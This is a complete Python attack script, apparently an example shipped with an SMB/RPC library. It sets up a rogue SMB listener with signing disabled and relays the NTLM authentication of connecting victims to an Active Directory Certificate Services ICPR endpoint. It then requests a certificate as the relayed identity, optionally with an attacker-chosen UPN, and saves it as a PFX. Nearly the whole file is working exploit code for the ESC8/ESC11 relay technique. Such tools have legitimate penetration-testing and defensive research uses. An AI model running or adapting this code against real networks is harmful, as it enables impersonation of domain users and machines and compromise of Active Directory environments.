# NTLM relay -> AD CS (MS-ICPR over ncacn_ip_tcp) example.
#
# Starts an SMB server that relays the NTLM authentication of any client that
# connects to it onward to a Certificate Authority's ICertPassage (ICPR) RPC
# endpoint, requesting a certificate as the relayed identity. This is the
# ESC8/ESC11-style "relay to RPC enrollment" primitive: it works when the CA
# does NOT set IF_ENFORCEENCRYPTICERTREQUEST (otherwise the CA rejects the
# unencrypted/CONNECT-level request).
#
# A relayed NTLM context can only pass tokens through - there is no session key
# to sign or seal with - so the onward RPC bind uses auth level CONNECT. See
# DCERPCAuth.from_relay() and ICPRRPC.from_tcp_relay().
#
# Coercion of a victim (PetitPotam / PrinterBug / etc.) is out of scope here;
# point a coercion tool (or, for testing, an SMB client) at this listener.

import asyncio
import os
import traceback

from asysocks.unicomm.common.target import UniTarget, UniProto
from aiosmb import logger
from aiosmb.protocol.smb2.commands.negotiate import NegotiateDialects
from aiosmb.wintypes.dtyp.constrcuted_security.guid import GUID
from aiosmb.relay.server import SMBRelayServer, SMBServerSettings
from aiosmb.dcerpc.v5.interfaces.icprmgr import ICPRRPC
from aiosmb.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from asyauth.protocols.spnego.relay.native import spnegorelay_ntlm_factory
from asyauth.protocols.ntlm.relay.native import NTLMRelaySettings, ntlmrelay_factory

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import Encoding, pkcs12, BestAvailableEncryption
from cryptography import x509
from cryptography.x509.oid import NameOID
from asn1crypto import core

PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")


def build_csr(cn, template, altname=None):
	"""Builds a DER-encoded CSR plus the matching private key."""
	key = rsa.generate_private_key(0x10001, 2048)
	builder = x509.CertificateSigningRequestBuilder().subject_name(
		x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
	)
	if altname is not None:
		builder = builder.add_extension(
			x509.SubjectAlternativeName([
				x509.OtherName(PRINCIPAL_NAME, core.UTF8String(altname).dump()),
			]),
			critical=False,
		)
	csr = builder.sign(key, hashes.SHA256())
	return key, csr.public_bytes(Encoding.DER)


async def handle_relay(relay, args, done_evt):
	"""Consumer: receives a notified relay object and drives the onward ICPR
	connection + certificate request using the relayed identity."""
	try:
		await log('[ICPR-RELAY] Relay session received, opening ICPR connection to %s' % args['ca_ip'])

		key, csr = build_csr(args['cn'], args['template'], args['altname'])

		auth_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY if args['encrypt'] else RPC_C_AUTHN_LEVEL_CONNECT
		service, err = await ICPRRPC.from_tcp_relay(
			relay,
			args['ca_ip'],
			auth_level=auth_level,
			dc_ip=args['dc_ip'],
			domain=args['domain'],
		)
		if err is not None:
			raise err

		await log('[ICPR-RELAY] Bound to ICPR, requesting certificate (CA=%s, template=%s)' % (args['ca'], args['template']))
		res, err = await service.request_certificate(
			args['ca'],
			csr,
			attributes=['CertificateTemplate:%s' % args['template']],
		)
		if err is not None:
			raise err

		await log('[ICPR-RELAY] Disposition: %s  RequestId: %s  Msg: %s' % (
			res['disposition'], res['request_id'], res['disposition_message']))

		if res['certificate'] in (None, b''):
			await log('[ICPR-RELAY][-] No certificate returned (disposition %s). '
					  'Likely the CA enforces encryption (ESC11 not applicable) or '
					  'the template is not issuable to the relayed identity.' % res['disposition'])
			return

		cert = x509.load_der_x509_certificate(res['certificate'])
		await log('[ICPR-RELAY][+] Got certificate! subject=%s issuer=%s serial=%X' % (
			cert.subject.rfc4514_string(), cert.issuer.rfc4514_string(), cert.serial_number))

		pfx = pkcs12.serialize_key_and_certificates(
			name=b'', key=key, cert=cert, cas=None,
			encryption_algorithm=BestAvailableEncryption(args['pfx_pass'].encode()),
		)
		with open(args['pfx_file'], 'wb') as f:
			f.write(pfx)
		await log('[ICPR-RELAY][+] Wrote PFX to %s (pass: %s)' % (args['pfx_file'], args['pfx_pass']))
	except Exception as e:
		await log('[ICPR-RELAY][ERR] %s' % e)
		traceback.print_exc()
	finally:
		done_evt.set()


async def log(msg):
	print(msg)


async def amain(listen_ip, listen_port, args, oneshot=True):
	auth_relay_queue = asyncio.Queue()
	done_evt = asyncio.Event()

	async def consumer():
		while True:
			relay = await auth_relay_queue.get()
			await handle_relay(relay, args, done_evt)
			if oneshot:
				return

	consumer_task = asyncio.create_task(consumer())

	target = UniTarget(listen_ip, listen_port, UniProto.SERVER_TCP)
	settings = SMBServerSettings(
		lambda: spnegorelay_ntlm_factory(auth_relay_queue, lambda: ntlmrelay_factory()),
		log_callback=log,
	)
	settings.preferred_dialects = [NegotiateDialects.SMB202]
	settings.ServerGuid = GUID.random()
	settings.RequireSigning = False

	server = SMBRelayServer(target, settings)
	await log('[ICPR-RELAY] Listening on %s:%s, relaying to CA %s (%s)' % (listen_ip, listen_port, args['ca'], args['ca_ip']))
	server_task = await server.run()

	if oneshot:
		await done_evt.wait()
		consumer_task.cancel()
		return
	await server_task


def main():
	import argparse
	parser = argparse.ArgumentParser(description='Relay NTLM authentication to an AD CS ICPR (RPC) endpoint and request a certificate')
	parser.add_argument('ca_ip', help="CA host IP/hostname (the ICPR endpoint is resolved via EPM on this host's port 135)")
	parser.add_argument('ca', help='CA name, e.g. "SEVENKINGDOMS-CA"')
	parser.add_argument('--listen-ip', default='0.0.0.0')
	parser.add_argument('--listen-port', type=int, default=445, help='SMB listener port (needs root for 445)')
	parser.add_argument('--template', default='User', help='certificate template (default: User)')
	parser.add_argument('--cn', default='relayed', help='subject common name')
	parser.add_argument('--alt-name', dest='altname', default=None, help='UPN for the subject alternative name')
	parser.add_argument('--dc-ip', dest='dc_ip', default=None)
	parser.add_argument('--domain', default=None)
	parser.add_argument('--encrypt', action='store_true', help='use PKT_PRIVACY instead of CONNECT (will NOT work with a relay; for comparison only)')
	parser.add_argument('--pfx-file', dest='pfx_file', default=None)
	parser.add_argument('--pfx-pass', dest='pfx_pass', default='admin')
	parser.add_argument('--keep-serving', action='store_true', help='keep the listener up after the first relay')
	args = parser.parse_args()

	opts = {
		'ca_ip': args.ca_ip,
		'ca': args.ca,
		'template': args.template,
		'cn': args.cn,
		'altname': args.altname,
		'dc_ip': args.dc_ip,
		'domain': args.domain,
		'encrypt': args.encrypt,
		'pfx_file': args.pfx_file or ('relay_%s.pfx' % os.urandom(4).hex()),
		'pfx_pass': args.pfx_pass,
	}
	asyncio.run(amain(args.listen_ip, args.listen_port, opts, oneshot=not args.keep_serving))


if __name__ == '__main__':
	main()
